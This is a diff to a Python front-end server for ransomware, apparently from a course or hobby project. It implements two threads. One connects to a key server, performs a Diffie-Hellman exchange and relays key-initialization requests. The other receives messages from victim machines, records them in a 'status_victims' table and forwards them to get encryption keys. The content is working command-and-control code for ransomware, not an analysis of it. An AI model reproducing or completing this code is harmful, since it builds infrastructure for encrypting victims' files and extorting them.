@@ -1,9 +1,15 @@
 import threading
+import utile.security as security
 import queue
 import socket
 from threading import Thread
-from utile.network import recv_msg, send_msg
+import utile.configgetter as config
+import utile.message as message
+from utile.network import recv_msg, send_msg, recv_msg_clear, send_msg_clear
 
+
+status_victims = {}
+lock = threading.Lock()
 
 class serveur_frontal(object):
 
@@ -39,7 +45,36 @@ class serveur_frontal(object):
         s.close()
 
     def thread_srv_cles(self, q_messages_receiv):
-        print('TODO')
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((config.get_ip("config.json"), config.get_port("config.json")))
+
+        key_f = security.diffie_hellman_recv_key(s)
+        q_messages_receiv.put('CONN_SRV_CLES')
+        q_messages_receiv.join()
+
+        while True:
+            msg = q_messages_receiv.get()
+            if 'queue' in msg.keys():
+                queue_response = msg['queue']
+                msg.pop('queue')  # Retire la clé 'queue' du dictionnaire msg
+            if "INITIALIZE_REQ" in msg:
+                send_msg(s, msg, key_f)
+                rsp = recv_msg(s, key_f)
+                if "INITIALIZE_KEY" in rsp:
+                    queue_response.put(rsp)
+
 
     def thread_ransomware(self, c_v, queue_messages_receiv, queue_victim):
-        print('TODO')
+        while True:
+            msg = recv_msg_clear(c_v)
+            if "INITIALIZE_REQ" in msg:
+                lock.acquire()
+                if msg['INITIALIZE'] in status_victims.keys():
+                    print(f"{msg['INITIALIZE']}")
+                    lock.release()
+                else:
+                    status_victims[msg['INITIALIZE']] = 'INITIALIZE'
+                    lock.release()
+                msg['queue'] = queue_victim
+                queue_messages_receiv.put(msg)
+                key_rsp = queue_victim.get()
